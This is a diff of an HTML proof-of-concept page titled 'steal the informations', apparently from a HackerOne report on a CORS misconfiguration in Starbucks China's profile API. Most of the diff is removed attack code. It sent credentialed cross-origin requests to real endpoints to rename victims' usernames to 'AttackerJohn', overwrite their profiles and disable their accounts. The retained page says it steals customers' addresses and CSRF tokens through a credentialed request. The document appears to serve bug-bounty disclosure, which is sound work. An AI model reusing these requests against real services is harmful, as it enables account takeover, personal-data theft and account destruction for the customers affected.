@@ -6,26 +6,17 @@
 </head>
 <title>steal the informations</title>
 <div>
-Attention!the loggin userName can be modified only once,click the button.
-<button id="modifyuserName" onclick="modifyUserName()">Modify the loggin name of starbucks's account</button>
+CORS misconfigure that lead custom's profile be stealed and do any malicous operation
 </div>
 </br>
 </br>
-<div>
-click the button to modify the profile of victim's account!
-<button id="modifyProfile" onclick="modifyProfile()">modify the Profile of starbucks's account</button>
-</div>
-<div text="steal customer's personal informaiton">
-steal customer's personal address
+<div text="steal customer's personal informaiton ">
+steal customer's personal address and their X-Csrf-Token and authenticity_token value
 <textarea id="customer" style="width: 200px; height: 150px;"></textarea>
 </div>
 </br>
 </br>
 </br>
-<div>
-Attention!click the button will lead your account disabled.
-<button id="disable" onclick="disable()">Disable the starbucks's account</button>
-</div>
 <script>
 
      var xmlhttp1 = new XMLHttpRequest()
@@ -42,83 +33,6 @@ Attention!click the button will lead your account disabled.
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
 	
-	function modifyUserName(){
-		var data = {};
-		data["userName"] = "AttackerJohn";
-		$.ajax({
-			    url : 'https://profile.starbucks.com.cn/api/account/username',
-			    type : 'PATCH',
-			    dataType:'json',
-			    contentType:'application/json',
-			    data:JSON.stringify(data),
-			    xhrFields: {
-			     withCredentials: true
-			 },
-			    success : function(response, textStatus, jqXhr) {
-				alert("Successfully !Your account's loggin userName have been modified!");
-			    },
-			    error : function(jqXHR, textStatus, errorThrown) {
-				// log the error to the console
-				console.log("The following error occured: " + textStatus, errorThrown);
-			    },
-			    complete : function() {
-				console.log("complete");
-			    }
-        });
-	}
-	
-		
-	function modifyProfile(){
-		var data = {};
-		data["firstName"] = "attackerFirstName";
-		data["lastName"] = "attackerlastName";
-		data["gender"] = "Male";
-		$.ajax({
-			    url : 'https://profile.starbucks.com.cn/api/Customers/update/patch',
-			    type : 'POST',
-			    dataType:'json',
-			    contentType:'application/json',
-			    data:JSON.stringify(data),
-			    xhrFields: {
-			     withCredentials: true
-			 },
-			    success : function(response, textStatus, jqXhr) {
-				alert("Successfully !Your account's profile have been modified!");
-			    },
-			    error : function(jqXHR, textStatus, errorThrown) {
-				// log the error to the console
-				console.log("The following error occured: " + textStatus, errorThrown);
-			    },
-			    complete : function() {
-				console.log("complete");
-			    }
-        });
-	}
-	
-	function disable(){
-		var data = {};
-		data["reason1"] = "Customer closed account";
-		$.ajax({
-			    url : 'https://profile.starbucks.com.cn/api/Customers/disable',
-			    type : 'POST',
-			    dataType:'json',
-			    contentType:'application/json',
-			    data:JSON.stringify(data),
-			    xhrFields: {
-			     withCredentials: true
-			 },
-			    success : function(response, textStatus, jqXhr) {
-				alert("Successfully !Your account's was disabled");
-			    },
-			    error : function(jqXHR, textStatus, errorThrown) {
-				// log the error to the console
-				console.log("The following error occured: " + textStatus, errorThrown);
-			    },
-			    complete : function() {
-				console.log("complete");
-			    }
-        });
-	}
 	
 </script>
 <a href="https://hackerone.com/johnstone">hacker1 johnstone</a>
